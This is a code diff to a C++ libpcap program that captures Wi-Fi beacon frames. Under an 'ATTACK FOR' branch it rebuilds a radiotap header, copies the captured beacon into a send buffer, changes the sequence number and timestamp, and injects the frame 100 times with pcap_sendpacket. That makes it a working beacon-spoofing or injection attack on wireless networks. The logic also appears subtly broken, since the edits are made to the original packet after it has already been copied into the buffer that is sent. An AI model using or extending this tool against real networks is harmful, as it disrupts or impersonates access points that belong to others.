@@ -73,9 +73,10 @@ int main(int argc, char* argv[]) {
 			GTRACE("invalid pointer %p %p\n", (void*)radiotapHdr, (void*)end);
 			continue;
 		}
-		if (len > 100) {
+		if (len != sizeof(RadiotapHdr) && len != 18 && len != 13) {
 			GTRACE("too big radiotap header len %u %p %p\n", len, (void*)radiotapHdr, (void*)end);
 		}
+		if (len == sizeof(RadiotapHdr) || len == 13) continue;
 		BeaconHdr* beaconHdr = PBeaconHdr(packet + radiotapHdr->len_);
 		if (beaconHdr->typeSubtype() != Dot11Hdr::Beacon) continue;
 
@@ -108,6 +109,18 @@ int main(int argc, char* argv[]) {
 				}
 				if (attack) {
 					GTRACE("ATTACK FOR %s\n", std::string(bssid).c_str());
+					char sendBuf[65536];
+					RadiotapHdr* sendRadiotapHdr = (RadiotapHdr*)sendBuf;
+					sendRadiotapHdr->len_ = sizeof(RadiotapHdr);
+					sendRadiotapHdr->pad_ = 0;
+					sendRadiotapHdr->ver_ = 0;
+					sendRadiotapHdr->present_ = 0;
+					BeaconHdr* sendBeaconHdr = PBeaconHdr(sendBuf + sizeof(RadiotapHdr));
+					uint32_t copyLen = header->caplen - radiotapHdr->len_;
+					assert(copyLen < 10000);
+					memcpy(sendBeaconHdr, beaconHdr, copyLen);
+					uint32_t writeLen = sizeof(RadiotapHdr) + copyLen;
+
 					le16_t seq = beaconHdr->seq_;
 					le64_t timestamp = beaconHdr->fixed_.timestamp_;
 					beaconHdr->seq_ = seq + 1;
@@ -117,7 +130,7 @@ int main(int argc, char* argv[]) {
 					usleep(timstampIncment - 10000); // -10 msec
 					for (int i = 0; i < 100; i++) {
 						beaconHdr->fixed_.timestamp_ = timestamp + 1000; // gilgil temp
-						int res = pcap_sendpacket(handle, packet, header->caplen);
+						int res = pcap_sendpacket(handle, (const u_char*)sendBuf, writeLen);
 						if (res != 0) {
 							fprintf(stderr, "pacp_sendpacket return %d - %s\n", res, pcap_geterr(handle));
 						}
